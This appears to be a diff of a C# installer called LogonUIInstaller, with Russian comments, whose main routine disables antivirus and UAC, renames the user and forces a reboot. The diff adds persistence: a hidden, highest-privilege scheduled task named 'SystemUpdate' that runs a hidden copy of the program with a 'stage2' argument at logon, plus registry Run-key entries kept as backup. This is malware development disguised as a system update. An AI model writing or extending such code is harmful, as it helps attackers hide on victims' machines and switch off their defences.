@@ -47,7 +47,7 @@ namespace LogonUIInstaller
                 DisableAntivirusAndUAC();
                 ApplySettingsToDefaultProfile();
                 RenameCurrentUserFixed();
-                AddToStartupWithStage2();
+                AddToStartupWithTaskScheduler(); // <-- НОВЫЙ МЕТОД
                 ForceReboot();
             }
             finally
@@ -708,8 +708,8 @@ namespace LogonUIInstaller
             return null;
         }
 
-        // ==================== АВТОЗАПУСК ====================
-        private static void AddToStartupWithStage2()
+        // ==================== НОВЫЙ АВТОЗАПУСК (ПЛАНИРОВЩИК ЗАДАЧ) ====================
+        private static void AddToStartupWithTaskScheduler()
         {
             try
             {
@@ -729,10 +729,64 @@ namespace LogonUIInstaller
                 File.SetAttributes(destPath, FileAttributes.Hidden | FileAttributes.ReadOnly);
                 File.SetAttributes(appDataPath, FileAttributes.Hidden | FileAttributes.ReadOnly);
 
-                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
-                    key.SetValue("SystemUpdate", $"\"{destPath}\" stage2", RegistryValueKind.String);
+                // Удаляем задачу, если уже существует
+                RunCommand("schtasks", "/delete /tn \"SystemUpdate\" /f");
 
-                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"))
+                // Создаём задачу в планировщике (запуск при входе пользователя)
+                string xml = $@"<?xml version=""1.0"" encoding=""UTF-16""?>
+<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">
+  <Triggers>
+    <LogonTrigger>
+      <Enabled>true</Enabled>
+    </LogonTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id=""Author"">
+      <RunLevel>HighestAvailable</RunLevel>
+      <UserId>{Environment.UserName}</UserId>
+      <LogonType>InteractiveToken</LogonType>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>true</AllowHardTerminate>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <IdleSettings>
+      <StopOnIdleEnd>true</StopOnIdleEnd>
+      <RestartOnIdle>false</RestartOnIdle>
+    </IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>true</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+    <Priority>7</Priority>
+  </Settings>
+  <Actions Context=""Author"">
+    <Exec>
+      <Command>""{destPath}""</Command>
+      <Arguments>stage2</Arguments>
+      <WorkingDirectory>{appDataPath}</WorkingDirectory>
+    </Exec>
+  </Actions>
+</Task>";
+
+                // Сохраняем XML во временный файл
+                string xmlPath = Path.Combine(Path.GetTempPath(), "SystemUpdateTask.xml");
+                File.WriteAllText(xmlPath, xml);
+
+                // Импортируем задачу в планировщик
+                RunCommand("schtasks", $"/create /xml \"{xmlPath}\" /tn \"SystemUpdate\" /f");
+
+                // Удаляем временный XML
+                try { File.Delete(xmlPath); } catch { }
+
+                // Дополнительно добавляем в Run (для надёжности, но планировщик главный)
+                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
                     key.SetValue("SystemUpdate", $"\"{destPath}\" stage2", RegistryValueKind.String);
 
                 using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run"))
